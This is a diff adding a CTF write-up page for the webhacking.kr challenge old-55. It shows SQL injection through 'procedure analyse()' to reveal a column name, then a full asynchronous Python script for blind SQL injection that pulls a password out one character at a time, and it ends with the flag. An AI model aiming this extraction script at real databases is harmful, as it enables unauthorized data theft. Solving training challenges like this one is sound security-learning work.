@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>old-55 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="old-55" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/old-55.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/old-55.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="old-55" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"old-55","url":"http://localhost:4000/CTF_writeups/webhacking.kr/old-55.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-old-55-solution">Webhacking old-55 Solution</h1>
+
+<p>first, i entered the score 8200 using the command line:</p>
+
+<p><img src="/CTF_writeups/webhacking.kr/images/old-55.png" alt="alt text" /></p>
+
+<p>then, I tried to find the third column name by using procedure analyse:
+<code class="language-plaintext highlighter-rouge">8200 limit 2,1 procedure analyse()</code>
+i got this: <code class="language-plaintext highlighter-rouge">id : webhacking.chall55.p4ssw0rd_1123581321 //</code>
+means the column name is: <code class="language-plaintext highlighter-rouge">p4ssw0rd_1123581321</code>.</p>
+
+<p>now, we will run the script to find the flag:
+[old-55]</p>
+<pre><code class="language-scripts/old-55.py">import asyncio
+import aiohttp
+import string
+
+def string_to_hex(s):
+    return ''.join(format(ord(char), '02x') for char in s)
+
+URL = "https://webhacking.kr/challenge/web-31/rank.php"
+SESSION_ID = "123"
+cookies = {'PHPSESSID':SESSION_ID}
+
+semaphore = asyncio.Semaphore(5)  # Limit concurrent requests
+
+async def fetch(session, payload):
+    params ={'score':payload}
+
+    timeout = aiohttp.ClientTimeout(total=10)  # Increase timeout duration
+    try:
+        async with session.post(URL, params=params, timeout=timeout) as response:
+            return await response.text()
+    except asyncio.TimeoutError:
+        # print(f"Timeout occurred for payload: {payload}")
+        return "timeout"  # Placeholder for timeout
+
+async def find_password_length(session):
+    for length in range(1, 50):  # Adjust the range based on expected max length
+        payload = f"8200 and LENGTH(p4ssw0rd_1123581321) like {length} -- "
+
+        response = await fetch(session, payload)
+        if "8200" in response:
+            print(f"Password length found: {length}")
+            return length
+    return None  # Return None if length not found
+
+async def main():
+    async with aiohttp.ClientSession() as session:
+        password_length = await find_password_length(session)
+        if password_length is None:
+            print("Could not determine password length.")
+            return
+        
+        password = ""
+        i = len(password) + 1
+        character_set = "_" + string.ascii_letters + string.digits + "{" + "}" + "-"+ '!' + "?" 
+
+        while len(password) &lt; password_length:
+            tasks = []
+            for c in character_set:  # Iterate through character set
+                hex = string_to_hex((password+c).replace("_", r"\_"))
+                payload = f"8200 and left(p4ssw0rd_1123581321,{i}) REGEXP BINARY 0x{hex}#)"
+                # print(c+":"+payload)
+                tasks.append(fetch(session, payload))
+
+                await asyncio.sleep(0.1)  # Delay between requests
+
+            responses = await asyncio.gather(*tasks)
+
+            for index, response in enumerate(responses):
+                if index &lt; len(character_set) and "8200" in response:
+                    c = character_set[index]  # Correctly access character from character set
+                    password += c
+                    print(password.ljust(password_length, '*'))
+                    break
+            
+            i += 1  # Move to the next character position
+
+if __name__ == "__main__":
+    asyncio.run(main())
+</code></pre>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{easy_peasy_lemon_squeezy!}</code></em></strong></p>
+
+
+      </section>
+    </div>
+  </body>
+</html>
